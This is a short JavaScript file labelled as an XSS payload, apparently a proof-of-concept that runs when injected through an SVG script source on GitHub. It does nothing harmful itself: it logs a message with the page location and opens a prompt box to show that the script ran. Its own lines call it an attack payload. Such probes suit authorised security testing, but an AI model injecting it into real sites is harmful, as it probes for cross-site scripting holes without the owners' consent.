function recxXssPayload() {
  const alertMsg = 'svg script src at GitHub: xss ' + document.location;
  console.log(alertMsg);
  window.prompt(alertMsg);
}

console.log('Recx XSS payload executed');
recxXssPayload();